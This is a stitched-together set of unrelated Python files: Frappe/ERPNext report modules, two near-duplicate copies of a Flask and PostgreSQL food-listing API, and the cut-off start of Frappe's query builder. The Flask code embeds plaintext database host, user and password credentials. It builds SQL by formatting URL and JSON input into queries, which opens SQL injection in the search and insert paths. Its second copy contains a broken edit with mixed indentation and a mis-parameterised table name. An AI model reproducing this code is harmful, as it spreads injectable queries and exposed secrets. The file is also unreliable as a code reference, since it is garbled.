				opening = get_leave_balance_on(employee.name, leave_type, filters.from_date,
					allocation_records_based_on_from_date.get(employee.name, frappe._dict()))                    

				# closing balance
				closing = get_leave_balance_on(employee.name, leave_type, filters.to_date,
					allocation_records_based_on_to_date.get(employee.name, frappe._dict()))

				row += [opening, leaves_taken, closing]

			data.append(row)
		
	return data

def get_approvers(department):
	if not department:
		return []

	approvers = []
	# get current department and all its child
	department_details = frappe.db.get_value("Department", {"name": department}, ["lft", "rgt"], as_dict=True)
	department_list = frappe.db.sql("""select name from `tabDepartment`
		where lft >= %s and rgt <= %s order by lft desc
		""", (department_details.lft, department_details.rgt), as_list = True)

	# retrieve approvers list from current department and from its subsequent child departments
	for d in department_list:
		approvers.extend([l.leave_approver for l in frappe.db.sql("""select approver from `tabDepartment Approver` \
			where parent = %s and parentfield = 'leave_approvers'""", (d), as_dict=True)])

	return approvers

# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors
# For license information, please see license.txt

from __future__ import unicode_literals
import frappe
from frappe.utils import getdate, add_days, today, cint
from frappe import _

def execute(filters=None):

	columns = get_columns()
	data = get_data(filters)
	return columns, data

def get_columns():

	columns = [
		{
			"fieldname": "territory",
			"fieldtype": "Link",
			"label": _("Territory"),
			"options": "Territory",
			"width": 100
		},
		{
			"fieldname": "item_group",
			"fieldtype": "Link",
			"label": _("Item Group"),
			"options": "Item Group",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Link",
			"options": "Item",
			"label": "Item",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Data",
			"label": _("Item Name"),
			"width": 150
		},

		{
			"fieldname": "customer",
			"fieldtype": "Link",
			"label": _("Customer"),
			"options": "Customer",
			"width": 100
		},
		{
			"fieldname": "last_order_date",
			"fieldtype": "Date",
			"label": _("Last Order Date"),
			"width": 100
		},
		{
			"fieldname": "qty",
			"fieldtype": "Float",
			"label": _("Quantity"),
			"width": 100
		},
		{
			"fieldname": "days_since_last_order",
			"fieldtype": "Int",
			"label": _("Days Since Last Order"),
			"width": 100
		},
	]

	return columns


def get_data(filters):

	data = []
	items = get_items(filters)
	sales_invoice_data = get_sales_details(filters)

	for item in items:
		if sales_invoice_data.get(item.name):
			item_obj = sales_invoice_data[item.name]
			if item_obj.days_since_last_order > cint(filters['days']):
				row = {
					"territory": item_obj.territory,
					"item_group": item_obj.item_group,
					"item": item_obj.name,
					"item_name": item_obj.item_name,
					"customer": item_obj.customer,
					"last_order_date": item_obj.last_order_date,
					"qty": item_obj.qty,
					"days_since_last_order": item_obj.days_since_last_order
				}
				data.append(row)
		else:
			row = {
				"item_group": item.item_group,
				"item": item.name,
				"item_name": item.item_name
			}
			data.append(row)

	return data


def get_sales_details(filters):

	data = []
	item_details_map = {}

	date_field = "s.transaction_date" if filters["based_on"] == "Sales Order" else "s.posting_date"

	sales_data = frappe.db.sql("""
		select s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,
		DATEDIFF(CURDATE(), {date_field}) as days_since_last_order
		from `tab{doctype}` s, `tab{doctype} Item` si
		where s.name = si.parent and s.docstatus = 1
		group by si.name order by days_since_last_order """                    
		.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)

	for d in sales_data:
		item_details_map.setdefault(d.item_name, d)

	return item_details_map

def get_items(filters):

	filters_dict = {
		"disabled": 0,
		"is_stock_item": 1
	}

	if filters.get("item_group"):
		filters_dict.update({
			"item_group": filters["item_group"]
		})

	if filters.get("item"):
		filters_dict.update({
			"name": filters["item"]
		})

	items = frappe.get_all("Item", fields=["name", "item_group", "item_name"], filters=filters_dict, order_by="name")

	return items


# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors
# For license information, please see license.txt

from __future__ import unicode_literals
import frappe
from frappe.utils import getdate, add_days, today, cint
from frappe import _

def execute(filters=None):

	columns = get_columns()
	data = get_data(filters)
	return columns, data

def get_columns():

	columns = [
		{
			"fieldname": "territory",
			"fieldtype": "Link",
			"label": _("Territory"),
			"options": "Territory",
			"width": 100
		},
		{
			"fieldname": "item_group",
			"fieldtype": "Link",
			"label": _("Item Group"),
			"options": "Item Group",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Link",
			"options": "Item",
			"label": "Item",
			"width": 150
		},
		{
			"fieldname": "item_name",
			"fieldtype": "Data",
			"label": _("Item Name"),
			"width": 150
		},

		{
			"fieldname": "customer",
			"fieldtype": "Link",
			"label": _("Customer"),
			"options": "Customer",
			"width": 100
		},
		{
			"fieldname": "last_order_date",
			"fieldtype": "Date",
			"label": _("Last Order Date"),
			"width": 100
		},
		{
			"fieldname": "qty",
			"fieldtype": "Float",
			"label": _("Quantity"),
			"width": 100
		},
		{
			"fieldname": "days_since_last_order",
			"fieldtype": "Int",
			"label": _("Days Since Last Order"),
			"width": 100
		},
	]

	return columns


def get_data(filters):

	data = []
	items = get_items(filters)
	sales_invoice_data = get_sales_details(filters)

	for item in items:
		if sales_invoice_data.get(item.name):
			item_obj = sales_invoice_data[item.name]
			if item_obj.days_since_last_order > cint(filters['days']):
				row = {
					"territory": item_obj.territory,
					"item_group": item_obj.item_group,
					"item": item_obj.name,
					"item_name": item_obj.item_name,
					"customer": item_obj.customer,
					"last_order_date": item_obj.last_order_date,
					"qty": item_obj.qty,
					"days_since_last_order": item_obj.days_since_last_order
				}
				data.append(row)
		else:
			row = {
				"item_group": item.item_group,
				"item": item.name,
				"item_name": item.item_name
			}
			data.append(row)

	return data


def get_sales_details(filters):

	data = []
	item_details_map = {}

	date_field = "s.transaction_date" if filters["based_on"] == "Sales Order" else "s.posting_date"

	sales_data = frappe.db.sql("""
		select s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,
		DATEDIFF(CURDATE(), {date_field}) as days_since_last_order
		from `tab{doctype}` s, `tab{doctype} Item` si
		where s.name = si.parent and s.docstatus = 1
		group by si.name order by days_since_last_order """                    
		.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)

	for d in sales_data:
		item_details_map.setdefault(d.item_name, d)

	return item_details_map

def get_items(filters):

	filters_dict = {
		"disabled": 0,
		"is_stock_item": 1
	}

	if filters.get("item_group"):
		filters_dict.update({
			"item_group": filters["item_group"]
		})

	if filters.get("item"):
		filters_dict.update({
			"name": filters["item"]
		})

	items = frappe.get_all("Item", fields=["name", "item_group", "item_name"], filters=filters_dict, order_by="name")

	return items


from flask import Flask
from flask import request
import simplejson as json
import psycopg2

""" Macros for relation and column names """
client_table_name = "\"Client\""
client_client_id_col = "\"ClientID\""
client_client_rating_col = "\"Client Rating\""

client_ratings_table_name = "\"Client Ratings\""
client_ratings_client_id_col = "\"ClientID\""
client_ratings_reviewer_id_col = "\"ReviewerID\""
client_ratings_comments_col = "\"Comments\""
client_ratings_rating_col = "\"Rating\""

cook_table_name = "\"Cook\""
cook_cook_id_col = "\"CookID\""
cook_cook_rating_col = "\"Cook Rating\""

cook_ratings_table_name = "\"Cook Rating\""
cook_ratings_cook_id_col = "\"CookID\""
cook_ratings_reviewer_id_col = "\"ReviewerID\""
cook_ratings_comments_col = "\"Comments\""
cook_ratings_rating_col = "\"Rating\""

listing_table_name = "\"Listing\""
listing_listing_id_col = "\"ListingID\""
listing_cook_id_col = "\"CookID\""
listing_food_name_col = "\"Food Name\""
listing_price_col = "\"Price\""
listing_location_col = "\"Location\""
listing_image_col = "\"Image\""

listing_tags_table_name = "\"Listing Tags\""
listing_tags_listing_id_col = "\"ListingID\""
listing_tags_tag_col = "\"Tag\""

order_table_name = "\"Order\""
order_client_id_col = "\"ClientID\""
order_listing_id_col = "\"ListingID\""
order_status_col = "\"Status\""
order_time_of_order_col = "\"Time of Order\""

user_table_name = "\"User\""
user_user_id_col = "\"UserID\""
user_password_col = "\"Password\""
user_fname_col = "\"FName\""
user_lname_col = "\"LName\""

""" Database login details """
db_host = "mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com"
db_name = "csc301breadwiener"
db_user = "csc301breadwiener"
db_password = "team7ithink"

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """ Removes the first and last characters (double quotes) from a string, and then return it """
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute("SELECT {}, {}, {}, {},"
                         " {}, {} FROM public.{}".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == "GET":
        return printTables()
    elif request.method == "POST":
        addToDB(request.get_json())
        conn.commit()
        return "Success"

def encase_in_quotes(stringy):
    return "\"" + stringy + "\""


"""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key "tagList" which is a list of tags:

"""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict["tags"]

    inserted = (list_id, cook_id, food_name, price, loc, image)                    
    #inserted = '(' + list_id + ',' + cook_id + ',' + food_name + ',' + price + ',' + loc + ',' + image + ')'

    sql = "INSERT INTO {} VALUES {}".format(listing_table_name, str(inserted).encode("ascii", "replace"))                    
    cur.execute(sql)                    

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """
    cur = conn.cursor()
    for x in tag_list:
        sql = "INSERT INTO {} VALUES {}".format(listing_tags_table_name, str((listing_id, x)))
        cur.execute(sql)                    


def getListId():
    """ Returns an unused listing_id """
    cur = conn.cursor()
    sql = "SELECT max({}) FROM {}".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)                    
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = "--------------------------ListingTable---------------------------<br>"
    sql = "SELECT * FROM {}".format(listing_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + "||	"
        strout = strout + "<br>"
    sql = "SELECT * FROM {}".format(listing_tags_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    strout += "<br><br><br>--------------------------TagTable-------------------------<br>"
    for x in listings:
        for y in x:
            strout = strout + str(y) + "	"

        strout = strout + "<br>"
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """
    Return the in progress order that corresponds with ClientId and ListingID
    """
    matched_rows = []

    order = conn.cursor()
    order.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                  " as t1 WHERE t1.\"ClientID\" = " + str(clientId) + " AND \"ListingID\" = " + str(listingId) +
                  " AND t1.\"Status\" = \'In progress\'")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """
    given a clientId and listingId cancel the order in progress associated with them
    """
    order = conn.cursor()
    order.execute(
        "UPDATE public.\"Order\" SET \"Status\" = 'Canceled' WHERE \"ClientID\" = " + str(clientId) +
        " AND \"ListingID\" = " + str(listingId) + " AND \"Status\" = \'In progress\'")
    conn.commit()

    order.close()


def order_to_json(rows):
    """
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """
    string = ""
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += ","

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return "[" + output + "]"  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """
    Return a list of Order tuples belonging to the client with the given id.
    """
    matched_rows = []

    orders = conn.cursor()
    orders.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                   " as t1 WHERE t1.\"ClientID\" = " + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = "\'Completed\'"


@app.route("/api/markComplete/<int:clientID>/<int:listingID>", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """ A function that changes the status of the order with listing id listing_id to complete.
        Returns "Success" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """

    sql = \
        """
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """.format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)                    
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception("The status of listing id's order was not changed. ClientID or ListingID may be out of range.")
    return "Success"


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
    # host="0.0.0.0", port=80

from flask import Flask
from flask import request
import simplejson as json
import psycopg2

""" Macros for relation and column names """
client_table_name = "\"Client\""
client_client_id_col = "\"ClientID\""
client_client_rating_col = "\"Client Rating\""

client_ratings_table_name = "\"Client Ratings\""
client_ratings_client_id_col = "\"ClientID\""
client_ratings_reviewer_id_col = "\"ReviewerID\""
client_ratings_comments_col = "\"Comments\""
client_ratings_rating_col = "\"Rating\""

cook_table_name = "\"Cook\""
cook_cook_id_col = "\"CookID\""
cook_cook_rating_col = "\"Cook Rating\""

cook_ratings_table_name = "\"Cook Rating\""
cook_ratings_cook_id_col = "\"CookID\""
cook_ratings_reviewer_id_col = "\"ReviewerID\""
cook_ratings_comments_col = "\"Comments\""
cook_ratings_rating_col = "\"Rating\""

listing_table_name = "\"Listing\""
listing_listing_id_col = "\"ListingID\""
listing_cook_id_col = "\"CookID\""
listing_food_name_col = "\"Food Name\""
listing_price_col = "\"Price\""
listing_location_col = "\"Location\""
listing_image_col = "\"Image\""

listing_tags_table_name = "\"Listing Tags\""
listing_tags_listing_id_col = "\"ListingID\""
listing_tags_tag_col = "\"Tag\""

order_table_name = "\"Order\""
order_client_id_col = "\"ClientID\""
order_listing_id_col = "\"ListingID\""
order_status_col = "\"Status\""
order_time_of_order_col = "\"Time of Order\""

user_table_name = "\"User\""
user_user_id_col = "\"UserID\""
user_password_col = "\"Password\""
user_fname_col = "\"FName\""
user_lname_col = "\"LName\""

""" Database login details """
db_host = "mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com"
db_name = "csc301breadwiener"
db_user = "csc301breadwiener"
db_password = "team7ithink"

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """ Removes the first and last characters (double quotes) from a string, and then return it """
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute("SELECT {}, {}, {}, {},"
                         " {}, {} FROM public.{}".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == "GET":
        return printTables()
    elif request.method == "POST":
        addToDB(request.get_json())
        conn.commit()
        return "Success"

def encase_in_quotes(stringy):
    return "\"" + stringy + "\""


"""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key "tagList" which is a list of tags:

"""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict["tags"]

    sql = "INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)"
	cur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """
    cur = conn.cursor()
    for x in tag_list:
        sql = "INSERT INTO {} VALUES {}".format(listing_tags_table_name, str((listing_id, x)))                    
        cur.execute(sql)                    


def getListId():
    """ Returns an unused listing_id """
    cur = conn.cursor()
    sql = "SELECT max({}) FROM {}".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)                    
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = "--------------------------ListingTable---------------------------<br>"
    sql = "SELECT * FROM {}".format(listing_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + "||	"
        strout = strout + "<br>"
    sql = "SELECT * FROM {}".format(listing_tags_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    strout += "<br><br><br>--------------------------TagTable-------------------------<br>"
    for x in listings:
        for y in x:
            strout = strout + str(y) + "	"

        strout = strout + "<br>"
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """
    Return the in progress order that corresponds with ClientId and ListingID
    """
    matched_rows = []

    order = conn.cursor()
    order.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                  " as t1 WHERE t1.\"ClientID\" = " + str(clientId) + " AND \"ListingID\" = " + str(listingId) +
                  " AND t1.\"Status\" = \'In progress\'")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """
    given a clientId and listingId cancel the order in progress associated with them
    """
    order = conn.cursor()
    order.execute(
        "UPDATE public.\"Order\" SET \"Status\" = 'Canceled' WHERE \"ClientID\" = " + str(clientId) +
        " AND \"ListingID\" = " + str(listingId) + " AND \"Status\" = \'In progress\'")
    conn.commit()

    order.close()


def order_to_json(rows):
    """
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """
    string = ""
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += ","

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return "[" + output + "]"  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """
    Return a list of Order tuples belonging to the client with the given id.
    """
    matched_rows = []

    orders = conn.cursor()
    orders.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                   " as t1 WHERE t1.\"ClientID\" = " + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = "\'Completed\'"


@app.route("/api/markComplete/<int:clientID>/<int:listingID>", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """ A function that changes the status of the order with listing id listing_id to complete.
        Returns "Success" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """

    sql = \
        """
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """.format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)                    
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception("The status of listing id's order was not changed. ClientID or ListingID may be out of range.")
    return "Success"


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
    # host="0.0.0.0", port=80

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.client import check_parent_permission
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
